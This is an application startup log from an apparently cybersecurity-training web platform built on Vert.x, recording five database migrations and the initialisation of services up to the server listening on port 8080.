2026-03-12 13:44:59.412 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "1 - Initial Schema"
2026-03-12 13:44:59.764 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "2 - Sample Learning Content"
2026-03-12 13:44:59.807 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
2026-03-12 13:44:59.826 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "4 - Add Quiz JSONB Support"
2026-03-12 13:44:59.875 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "5 - Insert Lessons"
2026-03-12 13:44:59.920 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Successfully applied 5 migrations to schema "public", now at version v5 (execution time 00:00.443s)
2026-03-12 13:44:59.924 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Applied 5 database migration(s)
2026-03-12 13:44:59.925 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing database connection pool...
2026-03-12 13:44:59.949 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Database connection pool initialized
2026-03-12 13:44:59.950 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing repositories...
2026-03-12 13:44:59.956 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Repositories initialized
2026-03-12 13:44:59.957 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing services...
2026-03-12 13:44:59.961 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Services initialized
2026-03-12 13:44:59.962 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing handlers...
2026-03-12 13:44:59.965 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Handlers initialized
2026-03-12 13:45:00.123 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ CyberSkill Platform started successfully
2026-03-12 13:45:00.124 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Server listening on http://0.0.0.0:8080
2026-03-12 13:45:00.124 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ API available at http://0.0.0.0:8080/api
2026-03-12 13:45:00.124 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Admin dashboard at http://0.0.0.0:8080/admin
2026-03-12 13:45:00.124 [vert.x-eventloop-thread-0] INFO  i.v.c.i.l.c.VertxIsolatedDeployer - Succeeded in deploying verticle
